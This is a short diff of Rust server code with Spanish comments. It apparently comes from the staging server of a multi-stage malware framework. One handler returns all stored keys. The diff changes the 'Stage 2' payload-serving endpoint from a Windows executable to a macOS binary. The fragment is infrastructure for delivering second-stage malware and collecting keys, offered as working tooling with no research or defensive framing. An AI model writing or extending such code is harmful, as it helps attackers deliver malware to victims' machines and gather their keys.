@@ -29,9 +29,8 @@ pub async fn get_keys(
     Json(storage.get_all())
 }
 
-// SERVIR EL PAYLOAD (Stage 2)
+// SERVIR EL PAYLOAD (Stage 2) - CORREGIDO
 pub async fn serve_payload() -> Vec<u8> {
-    // Leer el ejecutable compilado de stage2-payload
-    // Desde una ruta fija o desde el sistema de archivos
-    std::fs::read("./payloads/stage2.exe").unwrap_or_default()
+    // Leer el ejecutable compilado de stage2_macos
+    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
 }
